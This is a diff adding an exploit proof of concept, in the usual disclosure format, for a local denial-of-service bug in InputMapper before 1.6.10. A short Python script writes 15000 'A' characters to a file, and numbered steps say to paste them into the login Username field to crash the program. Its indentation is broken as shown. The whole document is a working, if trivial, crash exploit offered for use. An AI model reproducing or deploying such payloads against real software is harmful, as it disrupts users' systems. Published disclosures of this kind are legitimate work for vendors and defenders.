@@ -1,0 +1,30 @@
+# Exploit Title: InputMapper < 1.6.10 Local Denial of Service
+# Date: 20.09.2019
+# Vendor Homepage: https://inputmapper.com/
+# Software Link: https://inputmapper.com/downloads/category/2-input-mapper
+# Exploit Author: elkoyote07
+# Tested Version: 1.6.10
+# Tested on: Windows 10 x64
+
+
+# 1.- Start Input Mapper
+# 2.- Click on Guest (Top left)
+# 3.- Click on Login
+# 3.- Copy the content of exploit.txt in the Username field
+# 4.- Once copied double-click on Username field
+# 5.- Happy crash :)
+
+
+
+
+#!/usr/bin/python
+
+t = "A" * 15000
+
+try:
+f=open("exploit.txt","w")
+f.write(t)
+f.close()
+print "Done"
+except:
+print "Error"
